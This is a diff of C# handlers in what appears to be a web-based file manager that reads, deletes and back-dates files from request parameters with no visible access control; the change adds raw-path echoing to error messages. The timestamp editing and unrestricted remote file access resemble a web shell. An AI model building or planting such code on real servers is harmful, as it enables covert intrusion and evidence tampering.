@@ -89,8 +89,9 @@ string DoList()
 
 string DoRead()
 {
-    string p = FixPath(GetP("path"));
-    if (!File.Exists(p)) return ToJson(false, null, "File not found");
+    string raw = GetP("path");
+    string p = FixPath(raw);
+    if (!File.Exists(p)) return ToJson(false, null, "File not found. Raw=[" + raw + "] Fixed=[" + p + "]");
     try { string content = File.ReadAllText(p); var data = new Dictionary<string, object>(); data["path"] = p; data["content"] = content; data["size"] = content.Length; return ToJson(true, data, ""); }
     catch (Exception ex) { return ToJson(false, null, ex.Message); }
 }
@@ -115,8 +116,9 @@ string DoMkdir()
 
 string DoDelete()
 {
-    string p = FixPath(GetP("path"));
-    try { if (Directory.Exists(p)) Directory.Delete(p, true); else if (File.Exists(p)) File.Delete(p); else return ToJson(false, null, "Not found"); return ToJson(true, null, "Deleted"); }
+    string raw = GetP("path");
+    string p = FixPath(raw);
+    try { if (Directory.Exists(p)) Directory.Delete(p, true); else if (File.Exists(p)) File.Delete(p); else return ToJson(false, null, "Not found. Raw=[" + raw + "] Fixed=[" + p + "]"); return ToJson(true, null, "Deleted"); }
     catch (Exception ex) { return ToJson(false, null, ex.Message); }
 }
 
@@ -147,9 +149,11 @@ void DoDownload()
 
 string DoTouch()
 {
-    string p = FixPath(GetP("path")); string ts = GetP("time");
+    string raw = GetP("path");
+    string p = FixPath(raw);
+    string ts = GetP("time");
     try { DateTime dt = DateTime.Now; if (!string.IsNullOrEmpty(ts)) { long sec = long.Parse(ts); dt = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(sec).ToLocalTime(); }
-    if (Directory.Exists(p)) Directory.SetLastWriteTime(p, dt); else if (File.Exists(p)) File.SetLastWriteTime(p, dt); else return ToJson(false, null, "Not found"); return ToJson(true, null, "Modified"); }
+    if (Directory.Exists(p)) Directory.SetLastWriteTime(p, dt); else if (File.Exists(p)) File.SetLastWriteTime(p, dt); else return ToJson(false, null, "Not found. Raw=[" + raw + "] Fixed=[" + p + "]"); return ToJson(true, null, "Modified"); }
     catch (Exception ex) { return ToJson(false, null, ex.Message); }
 }
 
